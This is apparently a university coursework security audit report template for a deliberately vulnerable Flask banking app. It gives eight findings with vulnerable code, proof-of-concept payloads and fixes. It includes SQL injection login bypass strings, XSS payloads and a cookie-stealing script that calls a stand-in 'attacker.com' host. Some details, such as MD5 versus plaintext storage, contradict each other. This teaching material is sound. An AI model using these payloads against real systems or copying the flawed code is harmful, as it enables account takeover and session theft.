8TechBank - Comprehensive Security Audit Report

Course: BSE 4202 Software Security
Application: 8TechBank Simulated Online Banking Portal
Audit Type: Manual Source Code Review
Date: May 2026

How to use this template:
Each team member fills in their assigned vulnerability section following the exact structure of the completed examples. All findings must include the CWE identifier, OWASP Top 10 category, exact file name and line numbers, CVSS v3.1 score, security impact description, and recommended remediation.


1. Executive Summary

8TechBank is a Flask/SQLite web application intentionally built with exploitable vulnerabilities for educational purposes. This audit identified 8 distinct vulnerabilities spanning SQL Injection, Cross-Site Scripting, Broken Access Control, weak cryptography, insecure direct object references, and missing CSRF protection. The findings range in severity from Critical to Medium.


2. Vulnerability Assessment Matrix

Sorted by severity: Critical to Low

+----+------------------------------------------+---------+------------------------------+-----------------------------+-------+-----------+----------+---------------------+
| No | Vulnerability                            | CWE     | OWASP Top 10 (2021)          | File                        | Lines | CVSS v3.1 | Severity | Assigned To         |
+----+------------------------------------------+---------+------------------------------+-----------------------------+-------+-----------+----------+---------------------+
| 1  | SQL Injection in Login                   | CWE-89  | A03: Injection               | routes/auth.py              | 23-24 | 9.8       | Critical | Lutalo Allan        |
| 2  | Plaintext Password Storage               | CWE-256 | A02: Cryptographic Failures  | database.py                 | 19-21 | 9.1       | Critical | Lutalo Allan        |
| 3  | Reflected XSS in Admin Search            | CWE-79  | A03: Injection               | templates/admin.html        | 15-16 | 8.2       | High     | Nakanwagi Vanessa   |
| 4  | Missing CSRF on Fund Transfer            | CWE-352 | A01: Broken Access Control   | templates/transfer.html     | 35-36 | 8.0       | High     | Nakanwagi Vanessa   |
| 5  | Stored XSS in Transaction Notes          | CWE-79  | A03: Injection               | templates/transactions.html | 43    | 8.2       | High     | Yapyeko Rebecca     |
| 6  | Broken Access Control (IDOR) on Txns     | CWE-639 | A01: Broken Access Control   | routes/transactions.py      | 17-18 | 7.5       | High     | Musiimenta Cissyline|
| 7  | Broken Access Control on Admin Panel     | CWE-284 | A01: Broken Access Control   | routes/admin.py             | 11-13 | 8.8       | High     | Musiimenta Cissyline|
| 8  | Sensitive Data Exposure via API          | CWE-200 | A02: Cryptographic Failures  | routes/api.py               | 22-30 | 6.5       | Medium   | (any remaining)     |
+----+------------------------------------------+---------+------------------------------+-----------------------------+-------+-----------+----------+---------------------+


3. Detailed Findings


Finding 1 - Pattern 1: SQL Injection in Login

Assigned to: Lutalo Allan
Status: Completed

3.1.1 Identification

+---------------------+--------------------------------------------------------------+
| Field               | Detail                                                       |
+---------------------+--------------------------------------------------------------+
| CWE                 | CWE-89: Improper Neutralization of Special Elements in SQL   |
| OWASP Top 10 (2021) | A03: Injection                                               |
| File                | routes/auth.py                                               |
| Lines               | 23-24                                                        |
| Severity            | Critical                                                     |
| CVSS v3.1 Score     | 9.8  (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)                 |
+---------------------+--------------------------------------------------------------+

3.1.2 Vulnerable Code

File: routes/auth.py, Lines 23-24

    # VULN: SQL Injection - raw string concatenation
    query = "SELECT * FROM users WHERE username='" + username + "' AND password_hash='" + password_hash + "'"
    user = raw_query(query, fetchone=True)

The username value is taken directly from request.form (line 19) and concatenated into the SQL string without any sanitization or parameterization. The same pattern is repeated in the registration route at line 57.

3.1.3 Security Impact

An unauthenticated attacker can manipulate the SQL query by injecting metacharacters into the username field. This allows:

Authentication bypass: logging in as any user, including admin, without knowing their password using the payload:  admin' --

Data extraction: dumping the entire users table including password hashes, balances, and account numbers using UNION-based injection.

Full database compromise: an attacker could drop tables or insert rogue admin accounts by chaining SQL statements.

In a real banking context this is a direct path to account takeover for every customer in the system.

3.1.4 Proof of Concept

Navigate to http://localhost:5000/login and submit:

    Username:  admin' --
    Password:  anything

The resulting query becomes:

    SELECT * FROM users WHERE username='admin' --' AND password_hash='...'

The double-dash comments out the password check entirely, granting admin access with no valid credentials.

3.1.5 Remediation

Replace raw string concatenation with parameterized queries. SQLite's sqlite3 module supports this natively via the ? placeholder:

    query = "SELECT * FROM users WHERE username = ? AND password_hash = ?"
    conn = get_db()
    user = conn.execute(query, (username, password_hash)).fetchone()

The database driver handles escaping automatically and user input is never interpreted as SQL syntax. This fix must be applied consistently to every query in database.py and all route files.


Finding 2 - Pattern 5: Plaintext Password Storage

Assigned to: Lutalo Allan
Status: Completed

3.2.1 Identification

+---------------------+--------------------------------------------------------------+
| Field               | Detail                                                       |
+---------------------+--------------------------------------------------------------+
| CWE                 | CWE-256: Plaintext Storage of a Password                     |
| OWASP Top 10 (2021) | A02: Cryptographic Failures                                  |
| File                | database.py lines 19-21 (definition); routes/auth.py lines   |
|                     | 22 and 52 (usage); routes/api.py line 29 (exposure)          |
| Severity            | Critical                                                     |
| CVSS v3.1 Score     | 9.1  (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)                 |
+---------------------+--------------------------------------------------------------+

3.2.2 Vulnerable Code

File: database.py, Lines 19-21

    def md5_hash(password):
        # VULN: Plaintext password storage — no hashing applied
        return password

The function named md5_hash performs no hashing whatsoever — it returns the password string unchanged. All callers in seed_db() pass through plaintext values directly into the database.

File: routes/auth.py, Line 52 — Registration

    # VULN: Plaintext password storage — no hashing
    query = "INSERT INTO users (username, email, password, display_name, account_number, balance, role) VALUES ('" \
            + username + "', '" + email + "', '" + password + "', ..."

The raw password submitted by the user is inserted directly into the users.password column with no transformation.

File: routes/auth.py, Line 22 — Login

    # VULN: Plaintext password comparison
    query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"

Authentication compares the submitted password directly against the stored plaintext value.

File: routes/api.py, Line 29 — API Exposure

    # VULN: Sensitive data exposure — plaintext password leaked in API response
    'password': user['password'],

The /api/user/profile endpoint returns the plaintext password in its JSON response, making it directly readable over the network.

All passwords, including the admin account (admin123), are stored as plaintext strings in the users.password column.

3.2.3 Security Impact

Immediate full credential exposure on database breach.
Unlike hashed passwords which require cracking effort, plaintext passwords are immediately usable. Any attacker who gains read access to the database — via SQL injection, a backup file, or direct access — obtains every user's password with zero additional effort.

Credential reuse attacks.
Users commonly reuse passwords across services. Plaintext exposure of password123 from this application directly enables account takeover on email providers, other banking apps, and any other service where the user reused that password.

API leaks passwords over the wire.
The /api/user/profile endpoint returns "password": "admin123" in its JSON response. Any authenticated user can call this endpoint and retrieve their own plaintext password. Combined with other vulnerabilities (e.g., IDOR), an attacker could retrieve other users' passwords through the API alone — no database access required.

No cracking step required.
With MD5 or bcrypt, an attacker still needs to run a cracking tool. With plaintext storage, the attack is instantaneous and requires no computation, no wordlists, and no specialised tools.

Admin account fully compromised.
The seed admin account stores admin123 in plaintext. Any database read — including via the SQL injection vulnerabilities present in this application — immediately yields full administrative credentials.

3.2.4 Proof of Concept

Via the API (no database access needed):

Step 1: Log in as any registered user (e.g., user1 / password123).

Step 2: Call the profile API endpoint:

    GET /api/user/profile

Step 3: The JSON response directly contains the plaintext password:

    {
      "id": 2,
      "username": "user1",
      "email": "user1@example.com",
      "password": "password123",
      ...
    }

No cracking, no tools, no computation required.

Via SQL Injection (database read):

Step 1: Use the SQL injection vulnerability in the login form with payload:

    username: ' OR 1=1 --

Step 2: Query the users table directly:

    SELECT username, password FROM users;

Step 3: Result returns all credentials in plaintext:

    admin      | admin123
    user1      | password123
    user2      | password123
    user3      | password123
    user4      | password123
    user5      | password123

All credentials are immediately usable with no further steps.

3.2.5 Remediation

Replace plaintext storage with a purpose-built password hashing algorithm. bcrypt, scrypt, or Argon2id are all appropriate choices. These algorithms are intentionally slow, incorporate a unique salt per hash automatically, and are resistant to GPU-accelerated brute force.

Recommended fix using bcrypt:

    import bcrypt

    def hash_password(password: str) -> str:
        return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(rounds=12)).decode('utf-8')

    def verify_password(password: str, stored_hash: str) -> bool:
        return bcrypt.checkpw(password.encode('utf-8'), stored_hash.encode('utf-8'))

Update routes/auth.py registration to hash on store:

    # In register()
    password_hash = hash_password(password)
    # store password_hash instead of password

Update routes/auth.py login to verify instead of comparing directly:

    # In login()
    user = get_user_by_username(username)  # fetch user first
    if user and verify_password(password, user['password_hash']):
        # grant session

Remove the password field from the /api/user/profile response entirely — there is no legitimate reason to return a password (hashed or otherwise) in an API response.

Add bcrypt to requirements.txt:

    bcrypt==4.1.3

The rounds=12 parameter means each hash takes approximately 250ms to compute, which is negligible for a single login but makes bulk cracking computationally infeasible. Rename the database column from password to password_hash to reflect that it stores a hash, not a credential.


Finding 3 - Pattern 2: Reflected XSS in Admin Search

Assigned to: Nakanwagi Vanessa
Status: Pending

Instructions: Follow the same structure as Findings 1 and 2 above. Key details are provided below.

3.3.1 Identification

+---------------------+--------------------------------------------------------------+
| Field               | Detail                                                       |
+---------------------+--------------------------------------------------------------+
| CWE                 | CWE-79: Improper Neutralization of Input During Web Page Gen |
| OWASP Top 10 (2021) | A03: Injection                                               |
| File                | templates/admin.html                                         |
| Lines               | 15-16 (search value reflected); routes/admin.py line 17     |
| Severity            | High                                                         |
| CVSS v3.1 Score     | 8.2  (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N)                 |
+---------------------+--------------------------------------------------------------+

3.3.2 Vulnerable Code

File: templates/admin.html, Lines 15-16

    value="{{ search | safe }}"

File: templates/admin.html, Lines 19-21

    Showing results for: {{ search | safe }}

The search term from the URL query string (?search=...) is reflected directly back into the page using the Jinja2 safe filter, which disables HTML autoescaping. Any HTML or JavaScript in the search parameter is rendered by the browser.

3.3.3 Security Impact

(Vanessa to complete) Describe how an attacker can craft a malicious URL containing a script payload in the search parameter, send it to an admin user, and have the script execute in the admin's browser session. Cover session cookie theft and potential for privilege escalation.

3.3.4 Proof of Concept

(Vanessa to complete) Include the crafted URL with a script payload, e.g.:

    http://localhost:5000/admin?search=<script>alert(document.cookie)</script>

Describe what happens when the admin visits this link.

3.3.5 Remediation

(Vanessa to complete) The fix is to remove the safe filter so Jinja2 autoescaping applies:

    value="{{ search }}"
    Showing results for: {{ search }}

Also describe Content Security Policy as a defence-in-depth measure.


Finding 4 - Pattern 6: Missing CSRF Protection on Fund Transfer

Assigned to: Nakanwagi Vanessa
Status: Pending

Instructions: Follow the same structure as Findings 1 and 2 above. Key details are provided below.

3.4.1 Identification

+---------------------+--------------------------------------------------------------+
| Field               | Detail                                                       |
+---------------------+--------------------------------------------------------------+
| CWE                 | CWE-352: Cross-Site Request Forgery                          |
| OWASP Top 10 (2021) | A01: Broken Access Control                                   |
| File                | templates/transfer.html                                      |
| Lines               | 35-36 (confirm form has no CSRF token); routes/transfer.py   |
| Severity            | High                                                         |
| CVSS v3.1 Score     | 8.0  (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)                 |
+---------------------+--------------------------------------------------------------+

3.4.2 Vulnerable Code

File: templates/transfer.html, Lines 35-36

    {# VULN: No CSRF token on this form - intentional vulnerability #}
    <form method="POST" action="{{ url_for('transfer.transfer') }}">

The fund transfer confirmation form submits a POST request with no CSRF token. The server in routes/transfer.py performs no origin or token validation before processing the transfer.

3.4.3 Security Impact

(Vanessa to complete) Describe how an attacker can host a hidden HTML form on a malicious website that auto-submits a transfer request to 8TechBank. If a logged-in user visits the attacker's page, the browser automatically includes the session cookie and the transfer executes without the user's knowledge.

3.4.4 Proof of Concept

(Vanessa to complete) Include a sample malicious HTML page with a hidden auto-submitting form targeting /transfer with a crafted recipient account and amount.

3.4.5 Remediation

(Vanessa to complete) Describe implementing CSRF tokens using Flask-WTF or a manual token approach: generate a random token per session, embed it as a hidden field in the form, and validate it server-side before processing any state-changing request.


Finding 5 - Pattern 3: Stored XSS in Transaction Notes

Assigned to: Yapyeko Rebecca
Status: Pending

Instructions: Follow the same structure as Findings 1 and 2 above. Key details are provided below.

3.5.1 Identification

+---------------------+--------------------------------------------------------------+
| Field               | Detail                                                       |
+---------------------+--------------------------------------------------------------+
| CWE                 | CWE-79: Improper Neutralization of Input During Web Page Gen |
| OWASP Top 10 (2021) | A03: Injection                                               |
| File                | templates/transactions.html line 43; dashboard.html line 52  |
| Lines               | transactions.html: 43; dashboard.html: 52; admin.html: 57    |
| Severity            | High                                                         |
| CVSS v3.1 Score     | 8.2  (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N)                 |
+---------------------+--------------------------------------------------------------+

3.5.2 Vulnerable Code

File: templates/transactions.html, Line 43

    {# VULN: XSS - unsanitized user input rendered with | safe #}
    <td class="memo-cell">{{ txn.memo | safe }}</td>

The memo field is entered by a user during a fund transfer, stored in the transactions table, and then rendered on the transaction history page using the Jinja2 safe filter. This disables HTML autoescaping, meaning any HTML or JavaScript stored in the memo is executed by every user who views the transaction.

3.5.3 Security Impact

(Rebecca to complete) Explain the difference between stored XSS and reflected XSS. Describe how a malicious memo persists in the database and executes for every victim who loads the transactions page, including the admin. Cover session hijacking via document.cookie theft.

3.5.4 Proof of Concept

(Rebecca to complete) Log in, initiate a transfer, and enter the following in the memo field:

    <script>document.location='http://attacker.com/?c='+document.cookie</script>

Describe what happens when any user views their transaction history.

3.5.5 Remediation

(Rebecca to complete) Remove the safe filter so Jinja2 escapes the memo output:

    <td class="memo-cell">{{ txn.memo }}</td>

Apply the same fix to dashboard.html and admin.html. Also describe sanitizing input server-side before storage using a library such as bleach.


Finding 6 - Pattern 4: Broken Access Control (IDOR) on Transaction History

Assigned to: Musiimenta Cissyline
Status: Pending

Instructions: Follow the same structure as Findings 1 and 2 above. Key details are provided below.

3.6.1 Identification

+---------------------+--------------------------------------------------------------+
| Field               | Detail                                                       |
+---------------------+--------------------------------------------------------------+
| CWE                 | CWE-639: Authorization Bypass Through User-Controlled Key    |
| OWASP Top 10 (2021) | A01: Broken Access Control                                   |
| File                | routes/transactions.py                                       |
| Lines               | 17-18                                                        |
| Severity            | High                                                         |
| CVSS v3.1 Score     | 7.5  (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)                 |
+---------------------+--------------------------------------------------------------+

3.6.2 Vulnerable Code

File: routes/transactions.py, Lines 17-18

    # VULN: IDOR - no ownership verification on user_id param
    user_id = request.args.get('user_id', session['user_id'])

The user_id value is taken directly from the URL query string. There is no check that the requested user_id matches the session user_id. Any authenticated user can substitute any integer into the URL and view another user's complete transaction history.

3.6.3 Security Impact

(Cissyline to complete) Describe how this exposes the full financial history of every account in the system to any logged-in user. Cover the privacy and regulatory implications of exposing transaction data, counterparty names, amounts, and memos.

3.6.4 Proof of Concept

(Cissyline to complete) Log in as user1 and navigate to:

    http://localhost:5000/transactions?user_id=1

Then change the user_id to 2, 3, 4, 5 to view other users' transactions. Describe what data is exposed.

3.6.5 Remediation

(Cissyline to complete) Add an ownership check immediately after reading the parameter:

    user_id = request.args.get('user_id', session['user_id'])
    if int(user_id) != session['user_id']:
        return redirect(url_for('transactions.transactions'))

Only admin-role users should be permitted to view other users' transactions.


Finding 7 - Broken Access Control on Admin Panel (No Role Check)

Assigned to: Musiimenta Cissyline
Status: Pending

Instructions: Follow the same structure as Findings 1 and 2 above. Key details are provided below.

3.7.1 Identification

+---------------------+--------------------------------------------------------------+
| Field               | Detail                                                       |
+---------------------+--------------------------------------------------------------+
| CWE                 | CWE-284: Improper Access Control                             |
| OWASP Top 10 (2021) | A01: Broken Access Control                                   |
| File                | routes/admin.py                                              |
| Lines               | 11-13                                                        |
| Severity            | High                                                         |
| CVSS v3.1 Score     | 8.8  (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)                 |
+---------------------+--------------------------------------------------------------+

3.7.2 Vulnerable Code

File: routes/admin.py, Lines 11-13

    # VULN: Broken Access Control - role not verified for admin route
    if 'user_id' not in session:
        return redirect(url_for('auth.login'))

The /admin route only checks that a session exists. It does not verify that session['role'] equals admin. Any regular user who is logged in can navigate directly to /admin and access the full admin console.

3.7.3 Security Impact

(Cissyline to complete) Describe what a regular user gains access to: the full user table including all password hashes, all account balances, all transaction logs, and the user search function. Relate this to privilege escalation and data breach risk.

3.7.4 Proof of Concept

(Cissyline to complete) Log in as user1 (a regular user) and navigate directly to:

    http://localhost:5000/admin

Describe what is visible on the page.

3.7.5 Remediation

(Cissyline to complete) Add a role check immediately after the session check:

    if 'user_id' not in session:
        return redirect(url_for('auth.login'))
    if session.get('role') != 'admin':
        return redirect(url_for('dashboard.dashboard'))


Finding 8 - Sensitive Data Exposure via API

Assigned to: (remaining team member)
Status: Pending

Instructions: Follow the same structure as Findings 1 and 2 above. Key details are provided below.

3.8.1 Identification

+---------------------+--------------------------------------------------------------+
| Field               | Detail                                                       |
+---------------------+--------------------------------------------------------------+
| CWE                 | CWE-200: Exposure of Sensitive Information to Unauthorized   |
| OWASP Top 10 (2021) | A02: Cryptographic Failures                                  |
| File                | routes/api.py                                                |
| Lines               | 22-30                                                        |
| Severity            | Medium                                                       |
| CVSS v3.1 Score     | 6.5  (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)                 |
+---------------------+--------------------------------------------------------------+

3.8.2 Vulnerable Code

File: routes/api.py, Lines 22-30

    return jsonify({
        ...
        # VULN: Sensitive data exposure - password hash leaked in API response
        'password_hash': user['password_hash'],
    })

The /api/user/profile endpoint returns the full database row as JSON, explicitly including the password_hash field. This is unnecessary for any legitimate client use of the API.

3.8.3 Security Impact

(Assignee to complete) Describe how this combines with Finding 2 (MD5 hashing) to give any authenticated user a directly crackable credential. Also note that if IDOR were present on this endpoint, it would expose every user's hash.

3.8.4 Proof of Concept

(Assignee to complete) While logged in, call GET /api/user/profile and show the JSON response containing the password_hash field.

3.8.5 Remediation

(Assignee to complete) Remove the password_hash key from the JSON response. As a general principle, API responses should only include fields that the client has a legitimate need for.


4. Remediation Priority Summary

+----------+------------------------------------------+-----------------------------+------------------------------------------+
| Priority | Finding                                  | Effort                      | Impact if Fixed                          |
+----------+------------------------------------------+-----------------------------+------------------------------------------+
| Critical | SQL Injection in Login                   | Low - use ? parameters      | Eliminates auth bypass and data dump     |
| High     | Broken Access Control on Admin Panel     | Low - add role check        | Prevents privilege escalation            |
| High     | Missing CSRF on Fund Transfer            | Medium - add CSRF tokens    | Prevents cross-site fund theft           |
| High     | Reflected XSS in Admin Search            | Low - remove safe filter    | Prevents admin session hijacking         |
| High     | Stored XSS in Transaction Notes          | Low - remove safe filter    | Prevents persistent session hijacking    |
| Critical | Plaintext Password Storage               | Medium - replace with bcrypt| Eliminates immediate credential exposure |
| High     | IDOR on Transaction History              | Low - add ownership check   | Prevents financial data leakage          |
| Medium   | Sensitive Data Exposure via API          | Low - remove hash from JSON | Reduces offline cracking risk            |
+----------+------------------------------------------+-----------------------------+------------------------------------------+


5. Disclaimer

This application and report are produced for BSE 4202 Software Security coursework only. The vulnerabilities documented here are intentionally embedded for educational purposes. This application must never be deployed on a public-facing server.
